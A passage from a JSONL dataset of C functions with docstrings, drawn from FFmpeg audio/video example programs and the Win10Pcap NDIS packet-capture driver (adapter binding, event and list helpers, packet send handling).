container formats (like MP4) require global headers to be present\n     * Mark the encoder so that it behaves accordingly.\n     */\n    if ((*output_format_context)->oformat->flags & AVFMT_GLOBALHEADER)\n        avctx->flags |= AV_CODEC_FLAG_GLOBAL_HEADER;\n\n    /** Open the encoder for the audio stream to use it later. */\n    if ((error = avcodec_open2(avctx, output_codec, NULL)) < 0) {\n        fprintf(stderr, \"Could not open output codec (error '%s')\\n\",\n                av_err2str(error));\n        goto cleanup;\n    }\n\n    error = avcodec_parameters_from_context(stream->codecpar, avctx);\n    if (error < 0) {\n        fprintf(stderr, \"Could not initialize stream parameters\\n\");\n        goto cleanup;\n    }\n\n    /** Save the encoder context for easier access later. */\n    *output_codec_context = avctx;\n\n    return 0;\n\ncleanup:\n    avcodec_free_context(&avctx);\n    avio_closep(&(*output_format_context)->pb);\n    avformat_free_context(*output_format_context);\n    *output_format_context = NULL;\n    return error < 0 ? error : AVERROR_EXIT;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/** Add converted input audio samples to the FIFO buffer for later processing. */\n", "func_signal": "static int add_samples_to_fifo(AVAudioFifo *fifo,\n                               uint8_t **converted_input_samples,\n                               const int frame_size)", "code": "{\n    int error;\n\n    /**\n     * Make the FIFO as large as it needs to be to hold both,\n     * the old and the new samples.\n     */\n    if ((error = av_audio_fifo_realloc(fifo, av_audio_fifo_size(fifo) + frame_size)) < 0) {\n        fprintf(stderr, \"Could not reallocate FIFO\\n\");\n        return error;\n    }\n\n    /** Store the new samples in the FIFO buffer. */\n    if (av_audio_fifo_write(fifo, (void **)converted_input_samples,\n                            frame_size) < frame_size) {\n        fprintf(stderr, \"Could not write data to FIFO\\n\");\n        return AVERROR_EXIT;\n    }\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/** Initialize one audio frame for reading from the input file */\n", "func_signal": "static int init_input_frame(AVFrame **frame)", "code": "{\n    if (!(*frame = av_frame_alloc())) {\n        fprintf(stderr, \"Could not allocate input frame\\n\");\n        return AVERROR(ENOMEM);\n    }\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/**\n * Initialize a temporary storage for the specified number of audio samples.\n * The conversion requires temporary storage due to the different format.\n * The number of audio samples to be allocated is specified in frame_size.\n */\n", "func_signal": "static int init_converted_samples(uint8_t ***converted_input_samples,\n                                  AVCodecContext *output_codec_context,\n                                  int frame_size)", "code": "{\n    int error;\n\n    /**\n     * Allocate as many pointers as there are audio channels.\n     * Each pointer will later point to the audio samples of the corresponding\n     * channels (although it may be NULL for interleaved formats).\n     */\n    if (!(*converted_input_samples = calloc(output_codec_context->channels,\n                                            sizeof(**converted_input_samples)))) {\n        fprintf(stderr, \"Could not allocate converted input sample pointers\\n\");\n        return AVERROR(ENOMEM);\n    }\n\n    /**\n     * Allocate memory for the samples of all channels in one consecutive\n     * block for convenience.\n     */\n    if ((error = av_samples_alloc(*converted_input_samples, NULL,\n                                  output_codec_context->channels,\n                                  frame_size,\n                                  output_codec_context->sample_fmt, 0)) < 0) {\n        fprintf(stderr,\n                \"Could not allocate converted input samples (error '%s')\\n\",\n                av_err2str(error));\n        av_freep(&(*converted_input_samples)[0]);\n        free(*converted_input_samples);\n        return error;\n    }\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/* just pick the highest supported samplerate */\n", "func_signal": "static int select_sample_rate(const AVCodec *codec)", "code": "{\n    const int *p;\n    int best_samplerate = 0;\n\n    if (!codec->supported_samplerates)\n        return 44100;\n\n    p = codec->supported_samplerates;\n    while (*p) {\n        if (!best_samplerate || abs(44100 - *p) < abs(44100 - best_samplerate))\n            best_samplerate = *p;\n        p++;\n    }\n    return best_samplerate;\n}", "path": "build_static_lib\\ffmpeg\\armeabi-v7a\\share\\ffmpeg\\examples\\encode_audio.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/*\n * encode one video frame and send it to the muxer\n * return 1 when encoding is finished, 0 otherwise\n */\n", "func_signal": "static int write_video_frame(AVFormatContext *oc, OutputStream *ost)", "code": "{\n    int ret;\n    AVCodecContext *c;\n    AVFrame *frame;\n    int got_packet = 0;\n    AVPacket pkt = { 0 };\n\n    c = ost->enc;\n\n    frame = get_video_frame(ost);\n\n    av_init_packet(&pkt);\n\n    /* encode the image */\n    ret = avcodec_encode_video2(c, &pkt, frame, &got_packet);\n    if (ret < 0) {\n        fprintf(stderr, \"Error encoding video frame: %s\\n\", av_err2str(ret));\n        exit(1);\n    }\n\n    if (got_packet) {\n        ret = write_frame(oc, &c->time_base, ost->st, &pkt);\n    } else {\n        ret = 0;\n    }\n\n    if (ret < 0) {\n        fprintf(stderr, \"Error while writing video frame: %s\\n\", av_err2str(ret));\n        exit(1);\n    }\n\n    return (frame || got_packet) ? 0 : 1;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\muxing.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "/** Write the trailer of the output file container. */\n", "func_signal": "static int write_output_file_trailer(AVFormatContext *output_format_context)", "code": "{\n    int error;\n    if ((error = av_write_trailer(output_format_context)) < 0) {\n        fprintf(stderr, \"Could not write output file trailer (error '%s')\\n\",\n                av_err2str(error));\n        return error;\n    }\n    return 0;\n}", "path": "build_static_lib\\ffmpeg\\arm64-v8a\\share\\ffmpeg\\examples\\transcode_aac.c", "repo_name": "yangkun19921001/AVSample", "stars": 372, "license": "None", "language": "c", "size": 24236}
{"docstring": "// Create a list\n", "func_signal": "SL_LIST *SlNewList()", "code": "{\n\tSL_LIST *o;\n\n\to = (SL_LIST *)SlZeroMalloc(sizeof(SL_LIST));\n\n\to->lock = SlNewLock();\n\n\to->num_item = 0;\n\to->num_reserved = SL_INIT_NUM_RESERVED;\n\n\to->p = (void **)SlZeroMalloc(sizeof(void *) * o->num_reserved);\n\n\treturn o;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// NDIS bind notification procedure\n", "func_signal": "NDIS_STATUS SlNdisBindAdapterExProc(NDIS_HANDLE protocol_driver_context, NDIS_HANDLE bind_context, NDIS_BIND_PARAMETERS *bind_parameters)", "code": "{\n\tNDIS_STATUS ret = NDIS_STATUS_FAILURE;\n\n\tInterlockedIncrement(&sl->NumBoundAdapters);\n\n\t// Check the attributes of the adapter, and process only adapter which should be bound to\n\tif (bind_parameters->MediaType == NdisMedium802_3 &&\n\t\tbind_parameters->MacAddressLength == 6 &&\n//\t\t(bind_parameters->PhysicalMediumType == NdisPhysicalMedium802_3 || bind_parameters->PhysicalMediumType == 0) &&\n\t\tbind_parameters->AccessType == NET_IF_ACCESS_BROADCAST &&\n\t\tbind_parameters->DirectionType == NET_IF_DIRECTION_SENDRECEIVE &&\n\t\tbind_parameters->ConnectionType == NET_IF_CONNECTION_DEDICATED)\n\t{\n\t\t// Open the adapter\n\t\tNDIS_OPEN_PARAMETERS t;\n\t\tNDIS_MEDIUM medium_array = {NdisMedium802_3};\n\t\tSL_ADAPTER *a;\n\t\twchar_t adapter_id_tag[] = SL_ADAPTER_ID_PREFIX_W;\n\n\t\tSlZero(&t, sizeof(t));\n\t\tt.Header.Type = NDIS_OBJECT_TYPE_OPEN_PARAMETERS;\n\t\tt.Header.Revision = NDIS_OPEN_PARAMETERS_REVISION_1;\n\t\tt.Header.Size = NDIS_SIZEOF_OPEN_PARAMETERS_REVSION_1;\n\n\t\tt.AdapterName = bind_parameters->AdapterName;\n\t\tt.MediumArray = &medium_array;\n\t\tt.MediumArraySize = 1;\n\t\tt.SelectedMediumIndex = &sl->DummyInt;\n\t\tt.FrameTypeArray = NULL;\n\t\tt.FrameTypeArraySize = 0;\n\n\t\ta = SlZeroMalloc(sizeof(SL_ADAPTER));\n\n\t\ta->Lock = SlNewLock();\n\t\ta->AdapterName = SlNewUnicodeFromUnicodeString(bind_parameters->AdapterName);\n\n/*\n\t\tif (bind_parameters->MacOptions & NDIS_MAC_OPTION_8021Q_VLAN)\n\t\t{\n\t\t\ta->SupportVLan = true;\n\t\t}\n\n\t\tif (bind_parameters->TcpConnectionOffloadCapabilities != NULL)\n\t\t{\n\t\t\tif (bind_parameters->TcpConnectionOffloadCapabilities->Encapsulation & NDIS_ENCAPSULATION_IEEE_802_3_P_AND_Q ||\n\t\t\t\tbind_parameters->TcpConnectionOffloadCapabilities->Encapsulation & NDIS_ENCAPSULATION_IEEE_802_3_P_AND_Q_IN_OOB)\n\t\t\t{\n\t\t\t\ta->SupportVLan = true;\n\t\t\t}\n\t\t}\n*/\n\n\t\tSlCopy(a->AdapterId, a->AdapterName->String.Buffer, MIN(sizeof(a->AdapterId) - sizeof(wchar_t), a->AdapterName->String.Length));\n\t\tSlCopy(a->AdapterId, adapter_id_tag, sizeof(adapter_id_tag) - sizeof(wchar_t));\n\n\t\tSlCopy(a->MacAddress, bind_parameters->CurrentMacAddress, 6);\n\t\tSlCopy(&a->BindParamCopy, bind_parameters, sizeof(NDIS_BIND_PARAMETERS));\n\t\ta->BindingContext = bind_context;\n\t\ta->MtuSize = bind_parameters->MtuSize;\n\n\t\ta->IsOpenPending = true;\n\n\t\tret = NdisOpenAdapterEx(sl->ProtocolHandle, a, &t, bind_context, &a->AdapterHandle);\n\t\ta->AdapterHandle2 = a->AdapterHandle;\n\n\t\tif (ret != NDIS_STATUS_PENDING)\n\t\t{\n\t\t\ta->IsOpenPending = false;\n\t\t\tSlNdisOpenAdapterCompleteExProc(a, ret);\n\t\t}\n\t}\n\n\tif (ret != NDIS_STATUS_PENDING)\n\t{\n\t\tif (ret != NDIS_STATUS_SUCCESS)\n\t\t{\n\t\t\tInterlockedDecrement(&sl->NumBoundAdapters);\n\t\t}\n\t}\n\n\treturn ret;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Unloading procedure of the device driver\n", "func_signal": "void SlUnloadProc(DRIVER_OBJECT *driver_object)", "code": "{\n\t// Release the protocol\n\tif (sl->ProtocolHandle != NULL)\n\t{\n\t\tNdisDeregisterProtocolDriver(sl->ProtocolHandle);\n\t\tsl->ProtocolHandle = NULL;\n\t}\n\n\t// Release the basic device\n\tSlFreeDevice(sl->BasicDevice);\n\n\t// Release the adapter list\n\tSlFreeList(sl->AdapterList);\n\n\t// Initialize the SL context\n\tSlZero(sl, sizeof(SL_CTX));\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Reset the event\n", "func_signal": "void SlReset(SL_EVENT *event)", "code": "{\n\t// Validate arguments\n\tif (event == NULL)\n\t{\n\t\treturn;\n\t}\n\n\tKeResetEvent(event->event);\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Create an event\n", "func_signal": "SL_EVENT *SlNewEvent(char *name)", "code": "{\n\tSL_UNICODE *unicode_name;\n\tSL_EVENT *event;\n\t// Validate arguments\n\tif (name == NULL)\n\t{\n\t\treturn NULL;\n\t}\n\n\t// Convert to Unicode name\n\tunicode_name = SlNewUnicode(name);\n\tif (unicode_name == NULL)\n\t{\n\t\treturn NULL;\n\t}\n\n\t// Memory allocation\n\tevent = SlZeroMalloc(sizeof(SL_EVENT));\n\tif (event == NULL)\n\t{\n\t\tSlFreeUnicode(unicode_name);\n\t\treturn NULL;\n\t}\n\n\t// Create an event\n\tevent->event = IoCreateNotificationEvent(SlGetUnicode(unicode_name), &event->event_handle);\n\tif (event->event == NULL)\n\t{\n\t\tSlFree(event);\n\t\tSlFreeUnicode(unicode_name);\n\t\treturn NULL;\n\t}\n\n\t// Initialize the event\n\tKeInitializeEvent(event->event, NotificationEvent, FALSE);\n\tKeClearEvent(event->event);\n\n\t// Release the string\n\tSlFreeUnicode(unicode_name);\n\n\treturn event;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// NDIS OID request completion notification procedure\n", "func_signal": "void SlNdisOidRequestCompleteProc(NDIS_HANDLE protocol_binding_context, NDIS_OID_REQUEST *oid_request, NDIS_STATUS status)", "code": "{\n\tSL_ADAPTER *a = (SL_ADAPTER *)protocol_binding_context;\n\tbool no_not_free = false;\n\n\t// Check the results\n\tif (oid_request->RequestType == NdisRequestQueryInformation)\n\t{\n\t\tif (oid_request->DATA.QUERY_INFORMATION.Oid == OID_GEN_VENDOR_DESCRIPTION)\n\t\t{\n\t\t\tno_not_free = true;\n\t\t}\n\t}\n\n\t// Release the memory\n\tif (no_not_free == false)\n\t{\n\t\tSlFree(oid_request->DATA.SET_INFORMATION.InformationBuffer);\n\t}\n\n\tSlFree(oid_request);\n\n\t// Counter subtraction\n\tInterlockedDecrement(&a->NumPendingOidRequests);\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// NDIS packet transmission completion notification procedure\n", "func_signal": "void SlNdisSendNetBufferListsCompleteProc(NDIS_HANDLE protocol_binding_context, NET_BUFFER_LIST *net_buffer_lists,\n\t\t\t\t\t\t\t\t\t\t  ULONG send_complete_flags)", "code": "{\n\tNET_BUFFER_LIST *nbl;\n\n\tnbl = net_buffer_lists;\n\n\twhile (nbl != NULL)\n\t{\n\t\tNET_BUFFER_LIST *current_nbl = nbl;\n\t\tSL_FILE *f;\n\t\tNET_BUFFER *nb = NET_BUFFER_LIST_FIRST_NB(nbl);\n\n\t\tif (nb != NULL)\n\t\t{\n\t\t\tUINT size = NET_BUFFER_DATA_LENGTH(nb);\n\n\t\t\tNdisAdvanceNetBufferDataStart(nb, size, false, NULL);\n\t\t}\n\n\t\t// Get a file context\n\t\tf = ((void **)NET_BUFFER_LIST_CONTEXT_DATA_START(nbl))[0];\n\n\t\tnbl = NET_BUFFER_LIST_NEXT_NBL(nbl);\n\t\tNET_BUFFER_LIST_NEXT_NBL(current_nbl) = NULL;\n\n\t\t// Release the NET_BUFFER_LIST\n\t\tNdisFreeNetBufferList(current_nbl);\n\n\t\t// Reduce the number of packets being sent by 1\n\t\tInterlockedExchangeAdd(&f->NumSendingPacketets, (LONG)-1);\n\t\tInterlockedExchangeAdd(&f->Adapter->NumPendingSendPackets, (LONG)-1);\n\t}\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Create by copying the Unicode\n", "func_signal": "SL_UNICODE *SlNewUnicodeFromUnicodeString(UNICODE_STRING *src)", "code": "{\n\tSL_UNICODE *u;\n\t// Validate arguments\n\tif (src == NULL)\n\t{\n\t\treturn NULL;\n\t}\n\n\t// Memory allocation\n\tu = SlZeroMalloc(sizeof(SL_UNICODE));\n\tif (u == NULL)\n\t{\n\t\treturn NULL;\n\t}\n\n\tu->String.Length = u->String.MaximumLength = src->Length;\n\t\n\tu->String.Buffer = SlZeroMalloc(src->Length);\n\tSlCopy(u->String.Buffer, src->Buffer, src->Length);\n\n\treturn u;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Write procedure of the device\n", "func_signal": "NTSTATUS SlDeviceWriteProc(DEVICE_OBJECT *device_object, IRP *irp)", "code": "{\n\tSL_DEVICE *dev = *((SL_DEVICE **)device_object->DeviceExtension);\n\tNTSTATUS ret = STATUS_UNSUCCESSFUL;\n\tIO_STACK_LOCATION *irp_stack = IoGetCurrentIrpStackLocation(irp);\n\tUINT ret_size = 0;\n\n\tif (dev->IsBasicDevice == false)\n\t{\n\t\t// Adapter device\n\t\tSL_FILE *f = irp_stack->FileObject->FsContext;\n\n\t\tif (irp_stack->Parameters.Write.Length == SL_EXCHANGE_BUFFER_SIZE)\n\t\t{\n\t\t\tUCHAR *buf = irp->UserBuffer;\n\n\t\t\tif (dev->Halting || dev->Adapter->Halt || buf == NULL)\n\t\t\t{\n\t\t\t\t// Halting\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t// Write the packet\n\t\t\t\tMDL *mdl;\n\t\t\t\tUINT num = SL_NUM_PACKET(buf);\n\n\t\t\t\tProbeForRead(irp->UserBuffer, SL_EXCHANGE_BUFFER_SIZE, 1);\n\n\t\t\t\tmdl = IoAllocateMdl(buf, SL_EXCHANGE_BUFFER_SIZE, false, false, NULL);\n\t\t\t\tif (mdl != NULL)\n\t\t\t\t{\n\t\t\t\t\tMmProbeAndLockPages(mdl, KernelMode, IoReadAccess);\n\t\t\t\t}\n\n\t\t\t\tret = true;\n\t\t\t\tret_size = SL_EXCHANGE_BUFFER_SIZE;\n\n\t\t\t\tif (num >= 1 && num <= SL_MAX_PACKET_EXCHANGE)\n\t\t\t\t{\n\t\t\t\t\tUINT i, j;\n\t\t\t\t\tNET_BUFFER_LIST *nbl_head = NULL;\n\t\t\t\t\tNET_BUFFER_LIST *nbl_tail = NULL;\n\t\t\t\t\tUINT num_packets = 0;\n\t\t\t\t\tNDIS_HANDLE adapter_handle = NULL;\n\n\t\t\t\t\tSlLock(f->Adapter->Lock);\n\n\t\t\t\t\tif (f->Adapter->NumPendingSendPackets <= SL_MAX_PACKET_QUEUED)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Admit to send only if the number of packets being transmitted does not exceed the specified limit\n\t\t\t\t\t\tadapter_handle = f->Adapter->AdapterHandle;\n\t\t\t\t\t}\n\n\t\t\t\t\tif (adapter_handle != NULL)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Lock the file list which opens the same adapter\n\t\t\t\t\t\tSlLockList(dev->FileList);\n\t\t\t\t\t\tfor (j = 0;j < SL_LIST_NUM(dev->FileList);j++)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tSL_FILE *other = SL_LIST_DATA(dev->FileList, j);\n\n\t\t\t\t\t\t\tif (other != f)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t// Lock the receive queue of other file lists\n\t\t\t\t\t\t\t\tSlLock(other->RecvLock);\n\n\t\t\t\t\t\t\t\tother->SetEventFlag = false;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tfor (i = 0;i < num;i++)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tUINT packet_size = SL_SIZE_OF_PACKET(buf, i);\n\t\t\t\t\t\t\tUCHAR *packet_buf;\n\t\t\t\t\t\t\tNET_BUFFER_LIST *nbl = NULL;\n\t\t\t\t\t\t\tbool ok = false;\n\t\t\t\t\t\t\tbool is_vlan = false;\n\t\t\t\t\t\t\tUINT vlan_id = 0;\n\t\t\t\t\t\t\tUINT vlan_user_priority = 0, vlan_can_format_id = 0;\n\n\t\t\t\t\t\t\tif (packet_size > SL_MAX_PACKET_SIZE)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tpacket_size = SL_MAX_PACKET_SIZE;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse if (packet_size < SL_PACKET_HEADER_SIZE)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tpacket_size = SL_PACKET_HEADER_SIZE;\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tpacket_buf = (UCHAR *)SL_ADDR_OF_PACKET(buf, i);\n\n\t\t\t\t\t\t\tfor (j = 0;j < SL_LIST_NUM(dev->FileList);j++)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tSL_FILE *other = SL_LIST_DATA(dev->FileList, j);\n\n\t\t\t\t\t\t\t\tif (other != f)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t// Insert into the receive queue of the other file lists\n\t\t\t\t\t\t\t\t\tif (other->NumRecvPackets < SL_MAX_PACKET_QUEUED)\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tSL_PACKET *q = SlMalloc(sizeof(SL_PACKET));\n\n\t\t\t\t\t\t\t\t\t\tSlCopy(q->Data, packet_buf, packet_size);\n\t\t\t\t\t\t\t\t\t\tq->Size = packet_size;\n\t\t\t\t\t\t\t\t\t\tq->Next = NULL;\n\n\t\t\t\t\t\t\t\t\t\tif (other->RecvPacketHead == NULL)\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tother->RecvPacketHead = q;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tother->RecvPacketTail->Next = q;\n\t\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\t\tother->RecvPacketTail = q;\n\n\t\t\t\t\t\t\t\t\t\tother->NumRecvPackets++;\n\n\t\t\t\t\t\t\t\t\t\tother->SetEventFlag = true;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t// Allocate a new NET_BUFFER_LIST\n\t\t\t\t\t\t\tif (f->NetBufferListPool != NULL)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tnbl = NdisAllocateNetBufferList(f->NetBufferListPool, 16, 0);\n\n\t\t\t\t\t\t\t\tif (nbl != NULL)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tnbl->SourceHandle = adapter_handle;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tif (nbl != NULL)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t// Get the NET_BUFFER from the NET_BUFFER_LIST\n\t\t\t\t\t\t\t\tNET_BUFFER *nb = NET_BUFFER_LIST_FIRST_NB(nbl);\n\n\t\t\t\t\t\t\t\tNET_BUFFER_LIST_NEXT_NBL(nbl) = NULL;\n\n\t\t\t\t\t\t\t\t// Determine if the packet is IEEE802.1Q tagged packet\n\t\t\t\t\t\t\t\tif (dev->Adapter->SupportVLan && packet_size >= 18)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tif (packet_buf[12] == 0x81 && packet_buf[13] == 0x00)\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tUSHORT tag_us = 0;\n\n\t\t\t\t\t\t\t\t\t\t((UCHAR *)(&tag_us))[0] = packet_buf[15];\n\t\t\t\t\t\t\t\t\t\t((UCHAR *)(&tag_us))[1] = packet_buf[14];\n\n\t\t\t\t\t\t\t\t\t\tvlan_id = tag_us & 0x0FFF;\n\t\t\t\t\t\t\t\t\t\tvlan_user_priority = (tag_us >> 13) & 0x07;\n\t\t\t\t\t\t\t\t\t\tvlan_can_format_id = (tag_us >> 12) & 0x01;\n\n\t\t\t\t\t\t\t\t\t\tif (vlan_id != 0)\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tis_vlan = true;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tif (is_vlan)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tpacket_size -= 4;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tif (nb != NULL && OK(NdisRetreatNetBufferDataStart(nb, packet_size, 0, NULL)))\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t// Buffer copy\n\t\t\t\t\t\t\t\t\tUCHAR *dst = NdisGetDataBuffer(nb, packet_size, NULL, 1, 0);\n\n\t\t\t\t\t\t\t\t\tif (dst != NULL)\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tif (is_vlan == false)\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tSlCopy(dst, packet_buf, packet_size);\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tSlCopy(dst, packet_buf, 12);\n\t\t\t\t\t\t\t\t\t\t\tSlCopy(dst + 12, packet_buf + 16, packet_size + 4 - 16);\n\t\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\t\tok = true;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tNdisAdvanceNetBufferDataStart(nb, packet_size, false, NULL);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tif (ok == false)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif (nbl != NULL)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tNdisFreeNetBufferList(nbl);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif (nbl_head == NULL)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tnbl_head = nbl;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tif (nbl_tail != NULL)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tNET_BUFFER_LIST_NEXT_NBL(nbl_tail) = nbl;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tnbl_tail = nbl;\n\n\t\t\t\t\t\t\t\t((void **)NET_BUFFER_LIST_CONTEXT_DATA_START(nbl))[0] = f;\n\n\t\t\t\t\t\t\t\tif (is_vlan == false)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tNET_BUFFER_LIST_INFO(nbl, Ieee8021QNetBufferListInfo) = NULL;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tNDIS_NET_BUFFER_LIST_8021Q_INFO qinfo;\n\n\t\t\t\t\t\t\t\t\tqinfo.Value = &(((void **)NET_BUFFER_LIST_CONTEXT_DATA_START(nbl))[1]);\n\t\t\t\t\t\t\t\t\tSlZero(qinfo.Value, sizeof(UINT32) * 12);\n\n\t\t\t\t\t\t\t\t\tqinfo.TagHeader.VlanId = vlan_id;\n\t\t\t\t\t\t\t\t\tqinfo.TagHeader.UserPriority = vlan_user_priority;\n\t\t\t\t\t\t\t\t\tqinfo.TagHeader.CanonicalFormatId = vlan_can_format_id;\n\n\t\t\t\t\t\t\t\t\tNET_BUFFER_LIST_INFO(nbl, Ieee8021QNetBufferListInfo) = qinfo.Value;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tnum_packets++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tfor (j = 0;j < SL_LIST_NUM(dev->FileList);j++)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tSL_FILE *other = SL_LIST_DATA(dev->FileList, j);\n\n\t\t\t\t\t\t\tif (other != f)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t// Release the receive queue of other file lists\n\t\t\t\t\t\t\t\tSlUnlock(other->RecvLock);\n\n\t\t\t\t\t\t\t\t// Set an event\n\t\t\t\t\t\t\t\tif (other->SetEventFlag)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tSlSet(other->Event);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tSlUnlockList(dev->FileList);\n\n\t\t\t\t\t\tif (nbl_head != NULL)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tInterlockedExchangeAdd(&f->NumSendingPacketets, num_packets);\n\t\t\t\t\t\t\tInterlockedExchangeAdd(&f->Adapter->NumPendingSendPackets, num_packets);\n\n\t\t\t\t\t\t\tSlUnlock(f->Adapter->Lock);\n\n\t\t\t\t\t\t\tNdisSendNetBufferLists(adapter_handle, nbl_head, 0, 0);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tSlUnlock(f->Adapter->Lock);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tSlUnlock(f->Adapter->Lock);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (mdl != 